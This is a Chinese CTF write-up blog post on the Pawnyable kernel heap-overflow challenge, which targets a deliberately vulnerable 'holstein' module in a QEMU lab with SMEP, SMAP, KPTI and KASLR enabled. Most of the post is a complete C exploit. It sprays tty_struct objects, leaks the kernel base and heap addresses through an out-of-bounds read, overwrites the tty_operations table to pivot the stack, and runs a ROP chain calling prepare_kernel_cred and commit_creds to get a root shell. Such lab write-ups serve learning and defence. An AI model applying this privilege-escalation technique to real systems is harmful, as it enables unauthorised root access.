---
title: pawnyable-02
date: 2025-12-19 15:06:31
cover: ../static/pawnyable-02/cover.jpg
categories:
    - CTF
    - kernel
tags:
    - kernel pwn
    - learn
---

## 前言
本篇博客为Pawnyable第二个专题——内核堆溢出漏洞的利用。

## 题目分析
这里我们直接保护全开：
```bash
#!/bin/sh
qemu-system-x86_64 \
    -m 64M \
    -nographic \
    -kernel bzImage \
    -append "console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on kaslr" \
    -no-reboot \
    -cpu qemu64,+smap,+smep \
    -smp 1 \
    -monitor /dev/null \
    -initrd rootfs.cpio \
    -net nic,model=virtio \
    -net user
```
直接拖出vuln.ko逆向一下看看
相较于Pawnyable-01的附件仅有moudle-read和moudle-write有变化，返汇编代码如下：
![ida1](../static/pawnyable-02/ida1.png)
![ida2](../static/pawnyable-02/ida2.png)
可以看出这里最大的变化就是删掉了关于内核栈变量的使用，读写都是在内核堆上进行的，同样也有几乎任意size的越界读和越界写。

## 攻击思路
这里g_buf分配的堆块依旧是0x400大小，这里笔者介绍最为简单的一种攻击思路：
- 通过堆喷tty_struct结构体来实现g_buf与tty结构体相邻。
- 越界读泄露内核基址以及内核堆地址
- 越界写劫持tty_operations虚表，此处劫持内核程序流为栈迁移的rop，将内核栈迁移至内核堆上
- 由于内核堆地址可控，在g_buf上布置rop链实现提权

完整攻击脚本：
```C
/**
 * @file exp.c
 * @author keyboard (keyboardhitsz@163.com)
 * @brief keyboard's kernel pwn exp
 * @version 0.0
 * @date 2025-11-27
 * 
 * @copyright Copyright (c) 2025 keyboard
 * 
 */
# include</home/keyboard/ctf/tricks/kernelpwn.h>

#define SUCCESS_MSG(msg)    "\033[32m\033[1m" msg "\033[0m"
#define INFO_MSG(msg)       "\033[34m\033[1m" msg "\033[0m"
#define ERROR_MSG(msg)      "\033[31m\033[1m" msg "\033[0m"

#define log_success(msg)    puts(SUCCESS_MSG(msg))
#define log_info(msg)       puts(INFO_MSG(msg))
#define log_error(msg)      puts(ERROR_MSG(msg))

size_t prepare_kernel_cred,commit_creds;
/**
 * Utils 
 */
void get_kallsyms_addr(){

    FILE* sym_table_fd = fopen("/proc/kallsyms", "r");
    if(sym_table_fd < 0)
    {
        printf("\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n");
        exit(-1);
    }
    char buf[0x50], type[0x10];
    size_t addr;
    while(fscanf(sym_table_fd, "%llx%s%s", &addr, type, buf))
    {
        if(prepare_kernel_cred && commit_creds)
            break;

        if(!commit_creds && !strcmp(buf, "commit_creds"))
        {
            commit_creds = addr;
            printf("\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n", commit_creds);
            continue;
        }

        if(!strcmp(buf, "prepare_kernel_cred"))
        {
            prepare_kernel_cred = addr;
            printf("\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n", prepare_kernel_cred);
            continue;
        }
    }
}


/**
 * Challenge Interface
**/


/**
 * Exploitation
**/

void exploitation(void){

    save_status();
    int tty_spary[100];
    for(int i=0;i<50;i++){
        tty_spary[i] = open("/dev/ptmx",O_RDONLY|O_NOCTTY);
        if(tty_spary[i]==-1){
            log_error("error tty spray");
        }
    }
    int fd;
    fd = open("/dev/holstein",O_RDWR);
    if(fd==-1){
        log_error("error open fd");
    }
    for(int i=50;i<100;i++){
        tty_spary[i] = open("/dev/ptmx",O_RDONLY|O_NOCTTY);
        if(tty_spary[i]==-1){
            log_error("error tty spray");
        }
    }

    char buf[0x500];
    read(fd,buf,0x500);
    prepare_kernel_cred = 0xffffffff81074650;
    commit_creds = 0xffffffff810744b0;
    size_t heap_leak_vmlinux = commit_creds+0xffffffff9ae38880-0xffffffff9a2744b0;
    kernel_offset = *(size_t*)(buf+0x418)-heap_leak_vmlinux;
    kernel_base += kernel_offset;
    printf("kernel base is :%p\n",kernel_base);
    commit_creds += kernel_offset;
    prepare_kernel_cred += kernel_offset;

    size_t push_rdx_pop_rsp_r13_rbp = kernel_offset+0xffffffff813a478a;
    size_t pop_rdi = kernel_offset+0xffffffff810d748d;
    size_t mov_rdi_rax_rep = kernel_offset+0xffffffff8162707b;
    size_t pop_rcx = kernel_offset+0xffffffff8113c1c4;
    size_t swapgs_restore_regs_and_return_to_usermode = kernel_offset+0xffffffff81800e10+0x16;

    size_t g_buf = *(size_t*)(buf+0x438)-0x438;
    printf("g_buf is %p\n",g_buf);

    size_t * tty_optr= &buf[0x400];
    tty_optr[12] = push_rdx_pop_rsp_r13_rbp;
    tty_optr[3] = g_buf+0x400;

    size_t * rop = buf;
    *rop++ = pop_rdi;
    *rop++ = 0;
    *rop++ = prepare_kernel_cred;
    *rop++ = pop_rcx;
    *rop++ = 0;
    *rop++ = mov_rdi_rax_rep;
    *rop++ = commit_creds;
    *rop++ = swapgs_restore_regs_and_return_to_usermode;
    *rop++ = *(size_t*) "keyboard";
    *rop++ = *(size_t*) "keyboard";
    *rop++ = (size_t)get_root_shell;
    *rop++ = user_cs;
    *rop++ = user_rflags;
    *rop++ = user_sp+0x8;
    *rop++ = user_ss;

    write(fd,buf,0x500);
    for(int i=0;i<100;i++){
        ioctl(tty_spary[i],0xaaaaaaaa,g_buf-0x10);
    }

}

/**
 * Main Function
 */
int main(int argc, char ** argv)
{
    exploitation();
    return 0;   /* never arrive here... */
}
```
此方法最好想，但是其中使用到了比较复杂的gadget。除此之外，作者在原项目中还提到了两种额外的利用手法：

- 寻找gadgte构造任意内核地址读写，覆写modeprobe_path以及在内存中寻找cred来直接修改提权，这两种方法也很值得学习，笔者稍晚更新至本篇博客下。 